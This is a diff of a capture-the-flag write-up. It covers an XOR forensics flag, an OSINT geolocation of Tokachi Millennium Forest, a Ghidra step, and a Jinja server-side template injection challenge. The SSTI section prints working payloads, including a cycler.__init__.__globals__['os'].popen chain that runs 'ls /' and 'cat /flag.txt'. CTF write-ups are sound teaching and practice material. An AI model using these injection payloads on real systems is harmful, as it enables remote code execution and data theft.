@@ -11,7 +11,7 @@ We know the flag starts with CRHC. On doing xor of the first 4 bytes with "CRHC"
 
 **Flag**: CRHC{am_i_a_good_shark}
 
-### OSINT - 1
+### OSINT-1
 ![](assets/osint-1.png)\
 We were given this image. On reverse searching it, using Google Lens, I found Tokachi Millennium Forest. Using google maps, I found the [location](https://www.google.com/maps/place/Tokachi+Millennium+Forest/@42.9331924,142.8659399,3a,75y,239.76h,90.2t/data=!3m7!1e1!3m5!1sZTNN4dmnvt12x6Ny-Lc5cw!2e0!6shttps:%252F%252Fstreetviewpixels-pa.googleapis.com%252Fv1%252Fthumbnail%253Fcb_client%253Dmaps_sv.tactile%2526w%253D900%2526h%253D600%2526pitch%253D-0.20237850631576748%2526panoid%253DZTNN4dmnvt12x6Ny-Lc5cw%2526yaw%253D239.76383124031176!7i13312!8i6656!4m14!1m7!3m6!1s0x5f7379279f17f1a9:0x1915e7ba536cca74!2sTokachi+Millennium+Forest!8m2!3d42.9337374!4d142.8697976!16s%252Fg%252F11fklrnqc8!3m5!1s0x5f7379279f17f1a9:0x1915e7ba536cca74!8m2!3d42.9337374!4d142.8697976!16s%252Fg%252F11fklrnqc8).\
 We only need the coordinates upto 2 decimal places.
@@ -106,8 +106,8 @@ P[A\]
 9*3$"
 ```
 
-Using ghidra, I went to the same place.
-![](assets/ghidra.png)\
+Using ghidra, I went to the same place.\
+![](assets/ghidra.png)
 
 We can observe that if we xor the first 4 bytes with "CRHC", all of them give 35. I xored all the bytes with 35 and got the flag.
 ```
@@ -130,13 +130,13 @@ On going to the provided website, we find the text:
 hello world, the route is dms and get key
 ```
 On going to https://babyssti.crhc.club/dms, we find the text `hello None`. I tried a lot of different things and found when we set a value for the key parameter it becomes the word after hello.\
-Eg. https://babyssti.crhc.club/dms?key=mew gives `hello mew`.
+Eg. `https://babyssti.crhc.club/dms?key=mew` gives `hello mew`.
 
-Since the chall name has ssti, we check if the payload like {{3*2}} gives the output 4. It does hence ssti works.\
-We can try using this payload `{{'test'[::-1]}}` to check if it's jinja based (it works).\
+Since the chall name has ssti, we check if the payload like ```{{3*2}}``` gives the output 4. It does hence ssti works.\
+We can try using this payload ```{{'test'[::-1]}}``` to check if it's jinja based (it works).\
 
-The flag is present in the root (confirm using payload `{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls /').read() }}` ). \
-We can get the flag using `https://babyssti.crhc.club/dms?key={{%20self._TemplateReference__context.cycler.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20}}`
+The flag is present in the root (confirm using payload ```{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls /').read() }}``` ). \
+We can get the flag using ```https://babyssti.crhc.club/dms?key={{%20self._TemplateReference__context.cycler.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20}}```
 
 **Flag:** CRHC{w0w_u_rc3_m3_s0_34si1y_b89ew32f47r2}
 
